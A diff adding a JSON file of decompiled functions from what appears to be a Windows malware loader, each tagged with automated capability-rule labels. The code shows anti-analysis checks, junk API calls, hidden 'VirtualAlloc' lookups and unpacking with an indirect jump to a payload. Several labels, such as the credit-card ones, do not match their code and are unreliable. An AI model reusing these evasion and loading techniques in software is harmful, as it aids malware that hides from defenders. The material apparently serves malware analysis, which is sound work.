@@ -1,0 +1,69 @@
+{
+    "0043e4d0": {
+        "rules": [
+            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
+        ],
+        "decompiled_code": "\nvoid fcn.0043e4d0(void)\n\n{\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c1h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    for (*0x4d3878 = 0; *0x4d3878 < *0x4d3864; *0x4d3878 = *0x4d3878 + 4) {\n        *0x4d38cc = *0x4d38a8 + *0x4d3878;\n        **0x4d38cc = **0x4d38cc + *0x4d3878;\n        *0x4d38b8 = *0x4d3878 + 0x117ef8;\n        fcn.0043e5b0();\n    }\n    return;\n}\n",
+        "token_count": 202
+    },
+    "0043e6d0": {
+        "rules": [
+            "parse credit card information/29d58176023943f783771ab0ee81acbc"
+        ],
+        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043e7db)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0043e6d0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4c0h;\n    uint var_4bch;\n    uint var_4b8h;\n    uint var_4b4h;\n    uint var_42fh;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    int16_t var_2b8h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_25h;\n    int32_t var_ch;\n    code *var_4h;\n    \n    var_4h = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    var_25h._0_1_ = 0x96;\n    var_64h = 300;\n    var_5ch = 1;\n    var_60h = 0x4d38b0;\n    *0x4d3898 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    *0x4d38d0 = *(*0x4d3898 + 0x3c);\n    while( true ) {\n        while( true ) {\n            uVar1 = *0x4d38dc;\n            var_68h = *0x4d38dc;\n            iVar2 = (*_sym.imp.USER32.dll_LoadIconW)(*0x4d3894, 0x7f00);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            iVar2 = (*_sym.imp.USER32.dll_LoadIconW)(*0x4d3894, 0x109b);\n            if (iVar2 != 0) {\n                return 0;\n            }\n            iVar2 = (*var_4h)(uVar1, 0x4d38b4, 0, &var_5ch, &var_2c0h, &var_64h);\n            if (iVar2 == 0) break;\n            fcn.0043e6d0();\n        }\n        if (var_2bch == 0x6b) {\n            return 0;\n        }\n        if (var_2c0h._2_2_ == 0x69) break;\n        fcn.0043e6d0();\n    }\n    if (var_2bch._2_2_ == 0x71) {\n        var_ch = 0x4871ad;\n    }\n    if (var_2bch._2_2_ == 0x70) {\n        var_ch = 0x405e21;\n    }\n    if (var_2b8h == 0x49) {\n        var_ch = var_ch + 2;\n    }\n    if (var_2b8h == 0x48) {\n        var_ch = var_ch + 3;\n    }\n    if (var_2bch == 0x72) {\n        var_ch = var_ch + 0xcfde;\n    }\n    *0x4d3754 = *0x4d3754 - 0x14d;\n    if ((*0x4d3898 < *0x4d3754) && (*0x4d3754 < *0x4d3898 + *(*0x4d3898 + *0x4d38d0 + 0x50))) {\n        *0x4d3870 = 0;\n        return var_ch;\n    }\n    *0x4d3870 = 1;\n    *0x4d3898 = *0x4d389c;\n    return var_ch;\n}\n",
+        "token_count": 847
+    },
+    "null": {
+        "rules": [
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\ncode * __cdecl entry0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_11ch;\n    uint lpFileName;\n    uint var_114h;\n    uint32_t var_10dh;\n    uint var_108h;\n    uint32_t var_5ch;\n    uint var_4h;\n    \n    (*_sym.imp.USER32.dll_CreatePopupMenu)();\n    (*_sym.imp.GDI32.dll_AddFontResourceA)(\"CsdpPcEfCO\");\n    (*_sym.imp.USER32.dll_GetAsyncKeyState)(*0x4d3894);\n    (*_sym.imp.USER32.dll_IsCharLowerW)(*0x4d3894 & 0xffff);\n    (*_sym.imp.USER32.dll_GetClipboardViewer)();\n    (*_sym.imp.USER32.dll_CreateMenu)();\n    (*_sym.imp.GDI32.dll_GetEnhMetaFileW)(L\"pTGUaMrHRp\");\n    (*_sym.imp.USER32.dll_GetWindowTextLengthW)(*0x4d3894);\n    (*_sym.imp.USER32.dll_EndMenu)();\n    (*_sym.imp.USER32.dll_CharLowerW)(L\"DpRSPUNHaK\");\n    (*_sym.imp.USER32.dll_GetDC)(*0x4d3894);\n    (*_sym.imp.USER32.dll_GetTopWindow)(*0x4d3894);\n    (*_sym.imp.USER32.dll_VkKeyScanW)(*0x4d3894 & 0xffff);\n    (*_sym.imp.GDI32.dll_UnrealizeObject)(*0x4d3894);\n    (*_sym.imp.USER32.dll_GetClipboardOwner)();\n    (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n    (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n    (*_sym.imp.USER32.dll_GetTopWindow)(*0x4d3894);\n    (*_sym.imp.USER32.dll_GetMenuContextHelpId)(*0x4d3894);\n    (*_sym.imp.GDI32.dll_CreateSolidBrush)(*0x4d3894);\n    (*_sym.imp.GDI32.dll_FillPath)(*0x4d3894);\n    (*_sym.imp.USER32.dll_IsCharUpperW)(*0x4d3894 & 0xffff);\n    (*_sym.imp.USER32.dll_DestroyMenu)(*0x4d3894);\n    (*_sym.imp.GDI32.dll_WidenPath)(*0x4d3894);\n    (*_sym.imp.GDI32.dll_EndPage)(*0x4d3894);\n    (*_sym.imp.GDI32.dll_AddFontResourceW)(L\"RduwrYHNcF\");\n    (*_sym.imp.USER32.dll_LoadCursorFromFileA)(0x4d37c8);\n    for (var_5ch = 5; var_5ch < 0x7d6f; var_5ch = var_5ch + 0x29) {\n        (*_sym.imp.USER32.dll_LoadCursorFromFileW)(0x4d37cc);\n    }\n    (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n    (*_sym.imp.USER32.dll_IsWindowEnabled)(*0x4d3894);\n    (*_sym.imp.USER32.dll_GetParent)(*0x4d3894);\n    (*_sym.imp.USER32.dll_GetMessageTime)();\n    (*_sym.imp.USER32.dll_EndMenu)();\n    (*_sym.imp.GDI32.dll_AddFontResourceA)(\"JHebZnrWsf\");\n    *0x4d389c = arg_8h;\n    *0x4d387c = &stack0xfffffffc;\n    fcn.0043e950(0x7b, 4);\n    stack0xfffffef0 = 0;\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[0] = L'i';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[1] = L'n';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[2] = L't';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[3] = L'e';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[4] = L'r';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[5] = L'f';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[6] = L'a';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[8] = L'e';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[19] = L'-';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[9] = L'\\\\';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[10] = L'{';\n    str.111111ic76p3050f527498b5_11cf_bb82_00aa00bdce0bf[47] = L'}';\n    *0x4d3740 = *0x4d3740 + -2;\n    while( true ) {\n        if (0x12 < stack0xfffffef0) {\n            return NULL;\n        }\n        iVar1 = (**0x4d38c0)(*0x4d3740, L\"111111ic76p3050f527498b5-11cf-bb82-00aa00bdce0bf\", 0x4d38dc);\n        if (iVar1 == 0) break;\n        *NULL = stack0xfffffef0 + 6;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)(\"te5t235234\", 1, 3, 0, 3, 0x80, 0);\n    if ((iVar1 != -1) && (iVar1 != 0)) {\n        return NULL;\n    }\n    *0x4d38a4 = fcn.0043e6d0();\n    *0x4d3864 = fcn.0043e9a0(0x89a3);\n    fcn.0043e620(0x101d);\n    *0x4d3868 = *0x4d3864;\n    *0x4d3874 = *0x4d38a8 + 0x36510;\n    *0x4d3888 = 0;\n    *0x4d388c = 0;\n    *0x4d3884 = 3;\n    do {\n        iVar1 = fcn.0043e950(*0x4d374c, *0x4d3868);\n        if (*0x4d3864 <= *0x4d3888) break;\n        fcn.0043e380(0x216, 0xd7, iVar1);\n        *0x4d388c = *0x4d388c + *0x4d3884 + *0x4d374c;\n        *0x4d3888 = *0x4d3888 + *0x4d374c;\n        *0x4d3868 = *0x4d3868 - iVar1;\n        *0x4d386c = iVar1;\n    } while (*0x4d38a8 != 0);\n    fcn.0043e4b0(0x145b, 0xcfdb);\n    return fcn.0043e440;\n}\n",
+        "token_count": 1750
+    },
+    "0043e9a0": {
+        "rules": [
+            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
+        ],
+        "decompiled_code": "\nuint fcn.0043e9a0(void)\n\n{\n    uint uVar1;\n    uint var_d8h;\n    uint lpLibFileName;\n    uint var_20h;\n    uint var_4h;\n    \n    str.444ts44Alloc[2] = 'r';\n    str.444ts44Alloc[3] = 't';\n    str.444ts44Alloc[4] = 'u';\n    str.444ts44Alloc[5] = 'a';\n    str.444ts44Alloc[6] = 'l';\n    str.gernel32[0] = 'k';\n    str.444ts44Alloc[0] = 'V';\n    str.444ts44Alloc[1] = 'i';\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"gernel32\", \"444ts44Alloc\");\n    *0x4d38bc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    return *(*0x4d38a4 + -4);\n}\n",
+        "token_count": 224
+    },
+    "0043e380": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "contain loop"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0043e380(uint noname_0, uint noname_1, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1a4h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_21h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = *0x4d38a8 + *0x4d3888;\n    iVar3 = *0x4d38a4 + *0x4d388c;\n    for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n        cVar1 = *(iVar3 + var_8h);\n        *(iVar2 + var_8h) = 0;\n        *(iVar2 + var_8h) = *(iVar2 + var_8h) + cVar1;\n    }\n    return;\n}\n",
+        "token_count": 261
+    },
+    "0043e440": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0043e440(void)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *0x4d387c;\n    **0x4d387c = *0x4d3898;\n    puVar1[-1] = *0x4d3870;\n    // WARNING: Could not recover jumptable at 0x0043e476. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4d3874)();\n    return;\n}\n",
+        "token_count": 141
+    },
+    "0043e480": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0043e480(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint var_67h;\n    uint var_4h;\n    \n    *arg_8h = *arg_8h + arg_ch;\n    return;\n}\n",
+        "token_count": 62
+    },
+    "0043e4b0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0043e4b0(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0043e4d0(arg_8h, arg_ch);\n    return;\n}\n",
+        "token_count": 46
+    },
+    "0043e950": {
+        "rules": [
+            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
+        ],
+        "decompiled_code": "\nuint32_t __cdecl fcn.0043e950(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint var_fdh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < arg_ch) {\n        arg_ch = arg_8h;\n    }\n    *0x4d38c0 = _sym.imp.ADVAPI32.dll_RegOpenKeyW;\n    return arg_ch;\n}\n",
+        "token_count": 106
+    }
+}
